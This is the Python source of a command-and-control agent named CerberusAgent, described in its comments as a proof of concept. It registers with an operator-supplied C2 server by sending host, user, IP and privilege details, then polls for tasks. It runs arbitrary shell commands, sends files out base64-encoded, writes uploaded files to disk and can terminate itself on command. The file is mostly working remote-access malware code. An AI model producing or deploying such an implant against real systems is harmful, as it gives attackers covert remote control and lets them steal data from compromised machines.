import asyncio
import platform
import socket
import subprocess
import base64
import logging
import os
import sys
import json
import time
import requests
from typing import Dict, Optional, List

# Configure basic logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger("CerberusAgent")

class CerberusAgent:
    """
    Lightweight Python Agent for Cerberus C2.
    """
    
    def __init__(self, c2_url: str, beacon_interval: int = 10):
        self.c2_url = c2_url.rstrip("/")
        self.beacon_interval = beacon_interval
        self.agent_id: Optional[str] = None
        self.encryption_key: Optional[str] = None
        self.running = False
        
    async def register(self):
        """Registers the agent with the C2 server."""
        info = {
            "hostname": socket.gethostname(),
            "username": self._get_current_user(),
            "os": platform.system(),
            "os_version": platform.version(),
            "ip_internal": self._get_internal_ip(),
            "ip_external": self._get_external_ip(), # Async in real impl, simplified here
            "privileges": self._check_privileges(),
            "architecture": platform.machine(),
            "av_products": self._detect_av()
        }
        
        try:
            # In a real scenario, initial registration might be unencrypted or use a baked-in key
            # Here we simulate sending plain info to get a session key (weakest link, but ok for PoC)
            response = requests.post(f"{self.c2_url}/c2/register", json=info)
            response.raise_for_status()
            data = response.json()
            
            self.agent_id = data["agent_id"]
            # self.encryption_key = data.get("encryption_key") # If we implemented client-side encryption
            
            logger.info(f"[Agent] Registered with ID: {self.agent_id}")
            return True
        except Exception as e:
            logger.error(f"[Agent] Registration failed: {e}")
            return False
            
    async def beacon_loop(self):
        """Main beacon loop."""
        self.running = True
        logger.info("[Agent] Starting beacon loop...")
        
        while self.running:
            try:
                # Poll for tasks
                tasks = await self._beacon()
                
                # Execute tasks
                for task in tasks:
                    await self._execute_task(task)
                    
            except Exception as e:
                logger.error(f"[Agent] Beacon error: {e}")
            
            await asyncio.sleep(self.beacon_interval)

    async def _beacon(self) -> List[Dict]:
        """Sends beacon and retrieves tasks."""
        try:
            url = f"{self.c2_url}/c2/beacon/{self.agent_id}"
            response = requests.post(url)
            
            if response.status_code == 200:
                data = response.json()
                return data.get("tasks", [])
            else:
                logger.warning(f"[Agent] Beacon returned status: {response.status_code}")
                return []
        except Exception as e:
            logger.error(f"[Agent] Beacon connection failed: {e}")
            return []

    async def _execute_task(self, task: Dict):
        """Executes a single task."""
        task_type = task.get("type")
        task_data = task.get("data", {})
        task_id = task.get("id")
        
        logger.info(f"[Agent] Executing task: {task_id} ({task_type})")
        
        success = False
        result = {}
        
        try:
            if task_type == "shell":
                cmd = task_data.get("command")
                if cmd:
                    output = self._execute_shell(cmd)
                    result = {"output": output}
                    success = True
                else:
                    result = {"error": "No command specified"}
            
            elif task_type == "download":
                # Agent sends file content to C2
                path = task_data.get("path")
                if path and os.path.exists(path):
                    try:
                        with open(path, "rb") as f:
                            content = base64.b64encode(f.read()).decode()
                        result = {"content": content, "filename": os.path.basename(path)}
                        success = True
                    except Exception as e:
                        result = {"error": str(e)}
                else:
                    result = {"error": "File not found"}

            elif task_type == "upload":
                # Agent receives file content from C2 and saves it
                path = task_data.get("path") # Destination
                content = task_data.get("content") # Base64 encoded
                if path and content:
                    try:
                        decoded = base64.b64decode(content)
                        with open(path, "wb") as f:
                            f.write(decoded)
                        result = {"message": f"File written to {path}"}
                        success = True
                    except Exception as e:
                        result = {"error": str(e)}
                else:
                    result = {"error": "Missing path or content"}
            
            elif task_type == "self_destruct":
                self.running = False
                result = {"message": "Agent terminating"}
                success = True
                
            else:
                result = {"error": f"Unknown task type: {task_type}"}
                
        except Exception as e:
            result = {"error": f"Execution error: {str(e)}"}
            
        # Send result
        self._send_result(task_id, result, success)

    def _send_result(self, task_id: str, result: Dict, success: bool):
        try:
            url = f"{self.c2_url}/c2/task/{task_id}/result"
            payload = {
                "result": result,
                "success": success
            }
            requests.post(url, json=payload)
        except Exception as e:
            logger.error(f"[Agent] Failed to send result: {e}")

    def _execute_shell(self, command: str) -> str:
        try:
            proc = subprocess.run(
                command, 
                shell=True, 
                capture_output=True, 
                text=True, 
                timeout=30
            )
            return proc.stdout + proc.stderr
        except subprocess.TimeoutExpired:
            return "Execution timed out"
        except Exception as e:
            return str(e)

    # Helpers
    def _get_current_user(self) -> str:
        try:
            return os.getlogin()
        except:
            return "unknown"

    def _get_internal_ip(self) -> str:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "127.0.0.1"

    def _get_external_ip(self) -> str:
        # Simplified: no external request to avoid hanging/noise
        return "0.0.0.0" 

    def _check_privileges(self) -> str:
        try:
            if platform.system() == "Windows":
                import ctypes
                return "admin" if ctypes.windll.shell32.IsUserAnAdmin() else "user"
            else:
                return "root" if os.geteuid() == 0 else "user"
        except:
            return "unknown"

    def _detect_av(self) -> List[str]:
        # Placeholder
        return []

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <c2_url>")
        sys.exit(1)
        
    c2_url = sys.argv[1]
    agent = CerberusAgent(c2_url)
    
    # Run loop
    try:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        if loop.run_until_complete(agent.register()):
            loop.run_until_complete(agent.beacon_loop())
    except KeyboardInterrupt:
        pass
